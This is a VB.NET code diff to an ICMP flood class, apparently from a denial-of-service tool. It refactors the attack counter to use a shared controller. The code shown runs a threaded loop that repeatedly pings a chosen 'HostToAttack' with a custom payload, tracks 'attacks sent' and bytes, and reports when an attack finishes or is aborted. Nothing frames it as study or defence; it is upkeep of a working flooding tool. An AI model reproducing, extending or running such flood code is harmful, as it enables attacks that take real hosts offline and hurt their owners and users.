@@ -8,7 +8,6 @@ Public Class ICMP
     Private ThreadstoUse As Integer
     Private Threads As Thread()
     Private AttackRunning As Boolean = False
-    Private Attacks As Integer = 0
     Private Threadsto As Integer
     Private Length As Integer
     Private Timeout As Integer
@@ -40,8 +39,7 @@ Public Class ICMP
             _ThreadsEnded = 0
             ThreadstoUse = 0
             AttackRunning = False
-            GetFloodsBase().SetMessage("ICMP Attack on " & HostToAttack & " finished successfully. Attacks Sent: " & Attacks.ToString)
-            Attacks = 0
+            GetFloodsBase().SetMessage("ICMP Attack on " & HostToAttack & " finished successfully. Attacks Sent: " & GetFloodsBase.Get_AttackCount().ToString)
             GetFloodsBase().SetEnd()
         End If
     End Sub
@@ -55,8 +53,7 @@ Public Class ICMP
                 End Try
             Next
             AttackRunning = False
-            GetFloodsBase().SetMessage("ICMP Attack on " & HostToAttack & " aborted successfully. Attacks Sent: " & Attacks.ToString)
-            Attacks = 0
+            GetFloodsBase().SetMessage("ICMP Attack on " & HostToAttack & " aborted successfully. Attacks Sent: " & GetFloodsBase.Get_AttackCount().ToString)
 
         Else
             GetFloodsBase().SetMessage("No Condis Attack is Running!")
@@ -78,9 +75,9 @@ Public Class ICMP
                     Dim pingSender As Ping = New Ping()
                     Dim buffer As Byte() = Encoding.ASCII.GetBytes(Data)
                     Dim reply As PingReply = pingSender.Send(HostToAttack, Timeout, buffer)
-                    Attacks = Attacks + 1
-                    GetFloodsBase().Set_AttackUpStrengOnByte(Attacks * Length)
-                    GetFloodsBase().Set_AttackDownStrengOnByte(Attacks * Length)
+                    GetFloodsBase().Set_AttackCount(GetFloodsBase.Get_AttackCount() + 1)
+                    GetFloodsBase().SetAttackUpStrengOnByte(GetFloodsBase.Get_AttackCount() * Length)
+                    GetFloodsBase().SetAttackDownStrengOnByte(GetFloodsBase.Get_AttackCount() * Length)
                     Continue Do
                 Catch
                     Continue Do
